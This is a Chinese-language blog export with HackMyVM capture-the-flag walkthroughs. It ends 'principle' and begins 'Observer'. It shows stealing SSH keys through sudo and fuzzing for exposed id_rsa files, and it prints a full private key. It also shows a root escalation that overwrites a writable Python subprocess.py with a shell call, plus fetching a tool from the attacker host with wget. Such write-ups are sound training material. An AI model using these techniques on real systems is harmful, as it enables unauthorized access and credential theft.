<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:~$ ss <span class="token parameter variable">-tunel</span>
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   <span class="token number">0</span>        <span class="token number">0</span>                <span class="token number">0.0</span>.0.0:68            <span class="token number">0.0</span>.0.0:*       ino:14617 sk:1 cgroup:/system.slice/ifup@enp0s3.service <span class="token operator">&lt;</span>-<span class="token operator">></span>                    
tcp     LISTEN   <span class="token number">0</span>        <span class="token number">128</span>              <span class="token number">0.0</span>.0.0:3445          <span class="token number">0.0</span>.0.0:*       ino:14744 sk:2 cgroup:/system.slice/ssh.service <span class="token operator">&lt;</span>-<span class="token operator">></span>                            
tcp     LISTEN   <span class="token number">0</span>        <span class="token number">511</span>              <span class="token number">0.0</span>.0.0:80            <span class="token number">0.0</span>.0.0:*       ino:14694 sk:3 cgroup:/system.slice/nginx.service <span class="token operator">&lt;</span>-<span class="token operator">></span>                          
tcp     LISTEN   <span class="token number">0</span>        <span class="token number">128</span>                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:3445             <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*       ino:14757 sk:4 cgroup:/system.slice/ssh.service v6only:1 <span class="token operator">&lt;</span>-<span class="token operator">></span>                   
tcp     LISTEN   <span class="token number">0</span>        <span class="token number">511</span>                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80               <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*       ino:14695 sk:5 cgroup:/system.slice/nginx.service v6only:1 <span class="token operator">&lt;</span>-<span class="token operator">></span>  </code></pre>
<p>可以看到3445开放了ssh服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> elohim <span class="token function">cp</span> /home/gehenna/.ssh/id_rsa <span class="token builtin class-name">.</span>
talos@principle:/tmp$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxrwxrwt  <span class="token number">8</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 09:39 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root   root   <span class="token number">4096</span> Jul <span class="token number">11</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> elohim elohim <span class="token number">2655</span> Apr <span class="token number">21</span> 08:31 <span class="token number">123</span>
drwxrwxrwt  <span class="token number">2</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 .font-unix
drwxrwxrwt  <span class="token number">2</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 .ICE-unix
-rw-------  <span class="token number">1</span> elohim elohim <span class="token number">2655</span> Apr <span class="token number">21</span> 09:39 id_rsa
drwx------  <span class="token number">3</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 systemd-private-d7726c388b224e10a7fabf986dc00943-systemd-logind.service-1mgdKN
drwx------  <span class="token number">3</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 systemd-private-d7726c388b224e10a7fabf986dc00943-systemd-timesyncd.service-X7H5Ub
drwxrwxrwt  <span class="token number">2</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 .X11-unix
drwxrwxrwt  <span class="token number">2</span> root   root   <span class="token number">4096</span> Apr <span class="token number">21</span> 07:06 .XIM-unix
talos@principle:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa <span class="token parameter variable">-p</span> <span class="token number">3445</span> elohim@localhost
bash: /usr/bin/ssh: Permission denied</code></pre>
<p>然后并不行，因为我们没有ssh工具，我从kali cp过来一个</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># whereis ssh            </span>
ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cp /usr/bin/ssh .     </span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:~$ <span class="token function">wget</span> http://192.168.56.104:6677/ssh
--2024-04-21 <span class="token number">10</span>:14:12--  http://192.168.56.104:6677/ssh
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">986144</span> <span class="token punctuation">(</span>963K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘ssh’

<span class="token function">ssh</span>                 <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span> <span class="token number">963</span>.03K  --.-KB/s    <span class="token keyword">in</span> <span class="token number">0</span>.007s  

<span class="token number">2024</span>-04-21 <span class="token number">10</span>:14:12 <span class="token punctuation">(</span><span class="token number">132</span> MB/s<span class="token punctuation">)</span> - ‘ssh’ saved <span class="token punctuation">[</span><span class="token number">986144</span>/986144<span class="token punctuation">]</span>

talos@principle:~$ <span class="token function">chmod</span> +x <span class="token function">ssh</span>
talos@principle:~$ ./ssh <span class="token parameter variable">-i</span> id_rsa <span class="token parameter variable">-p</span> <span class="token number">3445</span> elohim@localhost
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token builtin class-name">:</span> </code></pre>
<p>需要输入一个密码，找找信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:/home/gehenna$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-xr-x <span class="token number">4</span> elohim elohim <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> root   root   <span class="token number">4096</span> Jul  <span class="token number">4</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> elohim elohim  <span class="token number">289</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> .bash_history
-rw-r----- <span class="token number">1</span> elohim elohim  <span class="token number">261</span> Jul  <span class="token number">5</span>  <span class="token number">2023</span> .bash_logout
-rw-r----- <span class="token number">1</span> elohim elohim <span class="token number">3830</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> .bashrc
-rw-r----- <span class="token number">1</span> elohim elohim  <span class="token number">777</span> Jul <span class="token number">13</span>  <span class="token number">2023</span> flag.txt
drw-r----- <span class="token number">3</span> elohim elohim <span class="token number">4096</span> Jul  <span class="token number">2</span>  <span class="token number">2023</span> .local
-rw-r----- <span class="token number">1</span> elohim elohim   <span class="token number">21</span> Jul <span class="token number">12</span>  <span class="token number">2023</span> .lock
-rw-r----- <span class="token number">1</span> elohim elohim  <span class="token number">807</span> Jul  <span class="token number">6</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> elohim elohim <span class="token number">4096</span> Jul  <span class="token number">6</span>  <span class="token number">2023</span> .ssh</code></pre>
<p>注意到gehenna下面还有一个.lock的文件夹 看看里面有什么</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:~$ <span class="token function">touch</span> .lock 
talos@principle:~$ <span class="token function">chmod</span> <span class="token number">666</span> .lock
talos@principle:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> elohim <span class="token function">cp</span> /home/gehenna/.lock <span class="token builtin class-name">.</span>
talos@principle:~$ <span class="token function">cat</span> .lock
7072696e6369706c6573</code></pre>
<p>转一下字符串<br><a href="https://img.tg/image/OpnPGK"><img src="https://ooo.0x0.ooo/2024/04/21/OpnPGK.png" alt="OpnPGK.png" loading="lazy"></a><br>因该是ssh连接的lock<code>principles</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:~$ ./ssh <span class="token parameter variable">-i</span> id_rsa <span class="token parameter variable">-p</span> <span class="token number">3445</span> elohim@localhost
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token builtin class-name">:</span> 


Son, you didn<span class="token string">'t listen to me, and now you'</span>re trapped.
You've come a long way, but this is the end of your journey.

elohim@principle:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>sml<span class="token punctuation">)</span></code></pre>
<p>成功拿到elohim的权限</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">elohim@principle:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> elohim on principle:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User elohim may run the following commands on principle:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /opt/reviewer.py
elohim@principle:~$ <span class="token function">cat</span> /opt/re*
rbash: cat:: No such <span class="token function">file</span> or directory</code></pre>
<p>看一下这个py文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">elohim@principle:~$ <span class="token function">nl</span> /opt/re*
     <span class="token number">1</span>  <span class="token comment">#!/usr/bin/python3</span>
       
     <span class="token number">2</span>  <span class="token function">import</span> os
     <span class="token number">3</span>  <span class="token function">import</span> subprocess
       
     <span class="token number">4</span>  def eliminar_archivos_incorrectos<span class="token punctuation">(</span>directorio<span class="token punctuation">)</span>:
     <span class="token number">5</span>      extensiones_validas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span>, <span class="token string">'.png'</span>, <span class="token string">'.gif'</span><span class="token punctuation">]</span>
     <span class="token number">6</span>      
     <span class="token number">7</span>      <span class="token keyword">for</span> <span class="token for-or-select variable">nombre_archivo</span> <span class="token keyword">in</span> os.listdir<span class="token punctuation">(</span>directorio<span class="token punctuation">)</span>:
     <span class="token number">8</span>          archivo <span class="token operator">=</span> os.path.join<span class="token punctuation">(</span>directorio, nombre_archivo<span class="token punctuation">)</span>
     <span class="token number">9</span>          
    <span class="token number">10</span>          <span class="token keyword">if</span> os.path.isfile<span class="token punctuation">(</span>archivo<span class="token punctuation">)</span>:
    <span class="token number">11</span>              _, extension <span class="token operator">=</span> os.path.splitext<span class="token punctuation">(</span>archivo<span class="token punctuation">)</span>
    <span class="token number">12</span>              
    <span class="token number">13</span>              <span class="token keyword">if</span> extension.lower<span class="token punctuation">(</span><span class="token punctuation">)</span> not <span class="token keyword">in</span> extensiones_validas:
    <span class="token number">14</span>                  os.remove<span class="token punctuation">(</span>archivo<span class="token punctuation">)</span>
    <span class="token number">15</span>                  print<span class="token punctuation">(</span>f<span class="token string">"Archivo eliminado: &#123;archivo&#125;"</span><span class="token punctuation">)</span>
       
    <span class="token number">16</span>  directorio <span class="token operator">=</span> <span class="token string">'/var/www/hellfire.t4l0s.hmv/archivos'</span>
       
    <span class="token number">17</span>  eliminar_archivos_incorrectos<span class="token punctuation">(</span>directorio<span class="token punctuation">)</span>
       
    <span class="token number">18</span>  def enviar_mensaje_usuarios_conectados<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    <span class="token number">19</span>      proceso <span class="token operator">=</span> subprocess.Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'who'</span><span class="token punctuation">]</span>, <span class="token assign-left variable">stdout</span><span class="token operator">=</span>subprocess.PIPE<span class="token punctuation">)</span>
    <span class="token number">20</span>      salida, _ <span class="token operator">=</span> proceso.communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token number">21</span>      lista_usuarios <span class="token operator">=</span> salida.decode<span class="token punctuation">(</span><span class="token punctuation">)</span>.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token number">22</span>      usuarios_conectados <span class="token operator">=</span> <span class="token punctuation">[</span>usuario.split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token for-or-select variable">usuario</span> <span class="token keyword">in</span> lista_usuarios<span class="token punctuation">]</span>
    <span class="token number">23</span>      mensaje <span class="token operator">=</span> f<span class="token string">"I have detected an intruder, stealing accounts: &#123;', '.join(usuarios_conectados)&#125;"</span>
    <span class="token number">24</span>      subprocess.run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'wall'</span>, mensaje<span class="token punctuation">]</span><span class="token punctuation">)</span>
       
    <span class="token number">25</span>  enviar_mensaje_usuarios_conectados<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>脚本上没有提权的手段，只能从库文件下手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">elohim@principle:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> subprocess.py <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-ls</span>
    <span class="token number">19941</span>     <span class="token number">84</span> -rw-rw-r--   <span class="token number">1</span> root     sml         <span class="token number">85745</span> Jul <span class="token number">11</span>  <span class="token number">2023</span> /usr/lib/python3.11/subprocess.py
    <span class="token number">20391</span>      <span class="token number">8</span> -rw-r--r--   <span class="token number">1</span> root     root         <span class="token number">7405</span> Mar <span class="token number">13</span>  <span class="token number">2023</span> /usr/lib/python3.11/asyncio/subprocess.py
elohim@principle:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>elohim<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>sml<span class="token punctuation">)</span></code></pre>
<p>正好所属组是 sml，直接修改这个库</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">elohim@principle:~$ <span class="token builtin class-name">echo</span> <span class="token string">'os.system("/bin/bash")'</span> <span class="token operator">></span> /usr/lib/python3.11/subprocess.py
elohim@principle:~$ <span class="token function">sudo</span> /usr/bin/python3 /opt/reviewer.py
root@principle:/home/gehenna<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@principle:/home/gehenna<span class="token comment"># cat /root/r*</span>
CONGRATULATIONS, the system has been pwned<span class="token operator">!</span>

          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    <span class="token punctuation">(</span>@@@@@/_____<span class="token punctuation">\</span>@@@@@<span class="token punctuation">)</span>
     @@@@<span class="token punctuation">(</span>_______<span class="token punctuation">)</span>@@@@
      @@@<span class="token punctuation">&#123;</span> <span class="token string">" L "</span> <span class="token punctuation">&#125;</span>@@@
       <span class="token punctuation">\</span>@  <span class="token punctuation">\</span> - /  @/
        /    ~    <span class="token punctuation">\</span>
      / <span class="token operator">==</span>        <span class="token operator">==</span> <span class="token punctuation">\</span>
    <span class="token operator">&lt;</span>      <span class="token punctuation">\</span> __ /      <span class="token operator">></span>
   / <span class="token punctuation">\</span>          <span class="token operator">|</span>    /  <span class="token punctuation">\</span>
 /    <span class="token punctuation">\</span>       <span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">=</span>       <span class="token punctuation">\</span>
<span class="token operator">|</span>      <span class="token punctuation">\</span>     ___<span class="token operator">|</span>_         <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token punctuation">\</span>//~~~<span class="token operator">|</span>---/ * ~~~~  <span class="token operator">|</span>     <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>  /<span class="token operator">|</span>   <span class="token operator">|</span>-----/~~~~<span class="token operator">|</span>  <span class="token operator">|</span>    /
 <span class="token punctuation">\</span>_ <span class="token operator">|</span>  /           <span class="token operator">|</span>__<span class="token operator">|</span>_ /


****************</code></pre>
<p>终于拿到root了，靶机不是太难，但是好费事.</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>子域fuzz</tag>
        <tag>cp</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Observer</title>
    <url>/posts/b9be1174/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.153</strong></p>
<p>刚打开靶机，我想用浏览器打开web看一下，发现怎么也打不开，甚至怀疑了我的网络问题……端口扫了一下发现没开放80端口</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.153       </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-16 <span class="token number">20</span>:18 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.153
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000094s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">3333</span>/tcp <span class="token function">open</span>  dec-notes
MAC Address: 08:00:27:F1:30:90 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.23</span> seconds</code></pre>
<p>开了个3333端口，也不知道扫描服务，搜索引擎搜了一下说是存在Prosiak木马，不了解，后面也确实没用到</p>
<h2 id="用户名fuzz"><a href="#用户名fuzz" class="headerlink" title="用户名fuzz"></a>用户名fuzz</h2><p>进入3333端口看一下<br><img src="https://img2.imgtp.com/2024/04/16/zSZUeHry.png" alt="1713270090941.png" loading="lazy"><br>下面一串奇怪的东西，当前目录在home目录下，可以尝试fuzz一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://192.168.56.153:3333/FUZZ/.ssh/id_rsa  -fw 8</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://192.168.56.153:3333/FUZZ/.ssh/id_rsa
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
 :: Filter           <span class="token builtin class-name">:</span> Response words: <span class="token number">8</span>
________________________________________________

jan                     <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">2602</span>, Words: <span class="token number">7</span>, Lines: <span class="token number">39</span>, Duration: 4ms<span class="token punctuation">]</span>
Marc%20Ludlum           <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">101</span>, Words: <span class="token number">9</span>, Lines: <span class="token number">4</span>, Duration: 9ms<span class="token punctuation">]</span></code></pre>
<p>fuzz到一个用户名jan并且可以访问他的ssh私钥<br>wget下来并用私钥连接，注意改权限为600</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># wget http://192.168.56.153:3333/jan/.ssh/id_rsa</span>
--2024-04-16 <span class="token number">20</span>:29:24--  http://192.168.56.153:3333/jan/.ssh/id_rsa
Connecting to <span class="token number">192.168</span>.56.153:3333<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: unspecified <span class="token punctuation">[</span>text/plain<span class="token punctuation">]</span>
Saving to: ‘id_rsa’

id_rsa                                        <span class="token punctuation">[</span> <span class="token operator">&lt;=</span><span class="token operator">></span>                                                                               <span class="token punctuation">]</span>   <span class="token number">2</span>.54K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-04-16 <span class="token number">20</span>:29:24 <span class="token punctuation">(</span><span class="token number">205</span> MB/s<span class="token punctuation">)</span> - ‘id_rsa’ saved <span class="token punctuation">[</span><span class="token number">2602</span><span class="token punctuation">]</span>

                                                                                                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat id_rsa     </span>
-----BEGIN OPENSSH PRIVATE KEY-----
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<span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh jan@192.168.56.153 -i id_rsa </span>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE<span class="token operator">!</span>          @
